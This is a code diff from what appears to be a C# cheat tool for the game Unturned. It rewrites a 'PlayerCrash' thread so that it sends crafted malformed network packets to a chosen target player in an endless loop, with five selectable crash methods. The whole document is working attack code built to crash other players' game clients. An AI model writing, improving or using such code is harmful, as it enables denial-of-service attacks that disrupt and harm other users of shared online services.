@@ -26,68 +26,35 @@ namespace Thanking.Threads
 			#endif
             Provider.onEnemyDisconnected += OnDisconnect;
 
-            ResourceManager RInstance;
-            AnimalManager AInstance;
-            
-            byte[] P1 = null;
-            byte[] P2 = null;
-            byte[] P3 = null;
-            byte[] P4 = null;
+            byte[] P1 = { (byte)ESteamPacket.UPDATE_UNRELIABLE_CHUNK_INSTANT, 255, 255 };
+            byte[] P2 = { (byte)ESteamPacket.UPDATE_VOICE, 255, 255 };
+            byte[] P3 = { (byte)ESteamPacket.UPDATE_UNRELIABLE_BUFFER, 0, 0 };
+            byte[] P4 = { (byte)ESteamPacket.UPDATE_VOICE, 0, 0 };
             byte[] P5 = { (byte)ESteamPacket.UPDATE_UNRELIABLE_CHUNK_INSTANT, 0, 0 };
             
-            int S1 = 0;
-            int S2 = 0;
-            int S3 = 0;
-            int S4 = 0;
+            int S1 = 3;
+            int S2 = 3;
+            int S3 = 3;
+            int S4 = 3;
             int S5 = 3;
-
-            int AID = 0;
-            int RID = 0;
-            int SID = 0;
             
             while (true)
             {
                 if (PlayerCrashEnabled)
                 {
-                    
-                    if (P1 == null)
-                    {
-                        RInstance = (ResourceManager) typeof(ResourceManager)
-                            .GetField("manager", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
-            
-                        AInstance = (AnimalManager) typeof(AnimalManager)
-                            .GetField("manager", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
-            
-                        RInstance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
-                            RInstance.channel.getCall("askResources"), out S1, out P1, (byte)0, (byte)0);
-            
-                        RInstance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
-                            RInstance.channel.getCall("askResources"), out S2, out P2, byte.MaxValue, byte.MaxValue);
-            
-                        StructureManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
-                            StructureManager.instance.channel.getCall("askStructures"), out S3, out P3, (byte)0, (byte)0);
-            
-                        AInstance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
-                            RInstance.channel.getCall("askAnimals"), out S4, out P4);
-                                
-                        AID = AInstance.channel.id;
-                        RID = RInstance.channel.id;
-                        SID = StructureManager.instance.channel.id;
-                    }
-                    
                     switch (MiscOptions.PCrashMethod)
                     {
                         case 1:
-                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P1, S1, RID);
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P1, S1, 0);
                             break;
-                        case 2:
-                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P2, S2, RID);
+                        case 2:    
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P2, S2, 0);
                             break;
                         case 3:
-                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P3, S3, SID);
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P3, S3, 0);
                             break;
                         case 4:
-                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P4, S4, AID);
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P4, S4, 0);
                             break;
                         case 5:
                             Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P5, S5, 0);
